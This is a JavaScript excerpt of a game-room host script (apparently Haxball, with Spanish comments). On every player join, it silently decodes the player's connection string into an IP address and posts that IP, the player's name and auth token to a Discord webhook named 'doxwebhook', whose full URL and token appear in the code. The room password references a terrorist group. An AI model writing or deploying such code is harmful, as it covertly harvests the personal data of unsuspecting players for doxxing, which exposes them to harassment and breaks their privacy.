...
const roomPassword = "bokoharam#2024"
const noPlayer = true;
...
const doxwebhook = 'https://discord.com/api/webhooks/1196975736255414343/Qf5LaMhsVeeBbPfj9nbA3e8spoORTt0zNv8a_gYl-uVuRSpqwY00wzFKwHgXTCPA4t9B';  // Reemplaza con tu URL de webhook
...
room.onPlayerJoin = function(player) {
    ...
    const playerInfo = {
        ...
        auth: player.auth,
        conn: player.conn,
        // Agrega cualquier otra información que desees enviar
    };

    // Agregar el jugador al array extendedP
    extendedP.push([player.id, player.auth, player.conn, false, 0, 0, false]);

    // Enviar información extendida a Discord usando el webhook
    sendToDiscord(playerInfo);

    // Actualizar roles u otras lógicas si es necesario
...
function sendToDiscord(playerInfo) {
    // Convertir la cadena hexadecimal de conn a una dirección IP
    const ip = hexToAscii(playerInfo.conn);

    // Construir el objeto a enviar
    const payload = {
        content: 'Nuevo jugador se unió:',
        embeds: [
            {
                title: 'Información del jugador:',
                fields: [
                    { name: 'Nombre', value: playerInfo.name, inline: true },
                    { name: 'Conn', value: ip, inline: true },
    ...
    // Realizar la solicitud al webhook de Discord
    fetch(doxwebhook, requestOptions)
        .then(response => response.json())
        .then(data => console.log('Mensaje enviado a Discord:', data))
        .catch(error => console.error('Error al enviar mensaje a Discord:', error));
}

// Función para convertir cadena hexadecimal a IP
...
room.onPlayerChat = function (player, message) {
  ...
  if (player.admin) {
	...
	var isMasterRole = localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] === "master";
    if (firstPlayer.id !== player.id && !isMasterRole) {
